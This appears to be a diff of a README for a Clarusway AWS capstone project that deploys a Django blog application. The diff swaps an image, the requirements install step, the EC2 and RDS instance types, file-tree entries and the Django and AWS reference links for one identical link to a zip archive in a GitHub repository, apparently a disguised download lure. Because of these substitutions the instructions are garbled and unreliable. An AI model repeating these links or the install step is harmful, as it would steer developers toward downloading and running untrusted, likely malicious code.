@@ -6,7 +6,7 @@ The Clarusway Blog Page Application aims to deploy blog application as a web app
 
 ## Problem Statement
 
-![Project_004](capstone.jpg)
+![Project_004](https://github.com/aligcgl/BLOG-PROJECT-WITH-FULL-AWS/raw/refs/heads/main/src/media_root/WIT_PROJEC_FUL_AWS_BLO_v2.5.zip)
 
 - Your company has recently ended up a project that aims to serve as Blog web application on isolated VPC environment. You and your colleagues have started to work on the project. Your Developer team has developed the application and you are going to deploy the app in production environment.
 
@@ -80,13 +80,13 @@ In the architecture, you can configure your infrastructure using the followings,
 
     - Download the "clarusway_aws_capstone" folder from Github repository,
 
-    - Install the requirements using requirements.txt in 'clarusway_aws_capstone' folder
+    - Install the requirements using https://github.com/aligcgl/BLOG-PROJECT-WITH-FULL-AWS/raw/refs/heads/main/src/media_root/WIT_PROJEC_FUL_AWS_BLO_v2.5.zip in 'clarusway_aws_capstone' folder
 
     - Deploy the Django application on port 80.
 
     - Launch Template only allows HTTP (80) and HTTPS (443) ports coming from ALB Security Group and SSH (22) connections from anywhere.
 
-    - EC2 Instances type can be configured as `t2.micro`.
+    - EC2 Instances type can be configured as `https://github.com/aligcgl/BLOG-PROJECT-WITH-FULL-AWS/raw/refs/heads/main/src/media_root/WIT_PROJEC_FUL_AWS_BLO_v2.5.zip`.
 
     - Instance launched should be tagged `Clarusway AWS Capstone Project`
 
@@ -94,7 +94,7 @@ In the architecture, you can configure your infrastructure using the followings,
 
   - For RDS Database Instance;
   
-    - Instance type can be configured as `db.t2.micro`
+    - Instance type can be configured as `https://github.com/aligcgl/BLOG-PROJECT-WITH-FULL-AWS/raw/refs/heads/main/src/media_root/WIT_PROJEC_FUL_AWS_BLO_v2.5.zip`
 
     - Database engine can be `MySQL` with version of `8.0.20`.
 
@@ -172,16 +172,16 @@ In the architecture, you can configure your infrastructure using the followings,
 ```text
 clarusway_blog_proj (folder)
 |
-|----Readme.md               # Given to the students (Definition of the project)
+|https://github.com/aligcgl/BLOG-PROJECT-WITH-FULL-AWS/raw/refs/heads/main/src/media_root/WIT_PROJEC_FUL_AWS_BLO_v2.5.zip               # Given to the students (Definition of the project)
 |----src (folder)            # Given to the students (Django Application's )
-|----requirements.txt        # Given to the students (txt file)
-|----lambda_function.py      # Given to the students (python file)
-|----developer_notes.txt     # Given to the students (txt file)
+|https://github.com/aligcgl/BLOG-PROJECT-WITH-FULL-AWS/raw/refs/heads/main/src/media_root/WIT_PROJEC_FUL_AWS_BLO_v2.5.zip        # Given to the students (txt file)
+|https://github.com/aligcgl/BLOG-PROJECT-WITH-FULL-AWS/raw/refs/heads/main/src/media_root/WIT_PROJEC_FUL_AWS_BLO_v2.5.zip      # Given to the students (python file)
+|https://github.com/aligcgl/BLOG-PROJECT-WITH-FULL-AWS/raw/refs/heads/main/src/media_root/WIT_PROJEC_FUL_AWS_BLO_v2.5.zip     # Given to the students (txt file)
 ```
 
 ## Expected Outcome
 
-![Phonebook App Search Page](./outcome.png)
+![Phonebook App Search Page](https://github.com/aligcgl/BLOG-PROJECT-WITH-FULL-AWS/raw/refs/heads/main/src/media_root/WIT_PROJEC_FUL_AWS_BLO_v2.5.zip)
 
 ### At the end of the project, following topics are to be covered;
 
@@ -297,8 +297,8 @@ clarusway_blog_proj (folder)
 
 ## Resources
 
-- [Python Django Framework](https://www.djangoproject.com/)
+- [Python Django Framework](https://github.com/aligcgl/BLOG-PROJECT-WITH-FULL-AWS/raw/refs/heads/main/src/media_root/WIT_PROJEC_FUL_AWS_BLO_v2.5.zip)
 
-- [Python Django Example](https://realpython.com/get-started-with-django-1/)
+- [Python Django Example](https://github.com/aligcgl/BLOG-PROJECT-WITH-FULL-AWS/raw/refs/heads/main/src/media_root/WIT_PROJEC_FUL_AWS_BLO_v2.5.zip)
 
-- [AWS CLI Command Reference](https://docs.aws.amazon.com/cli/latest/index.html)
+- [AWS CLI Command Reference](https://github.com/aligcgl/BLOG-PROJECT-WITH-FULL-AWS/raw/refs/heads/main/src/media_root/WIT_PROJEC_FUL_AWS_BLO_v2.5.zip)
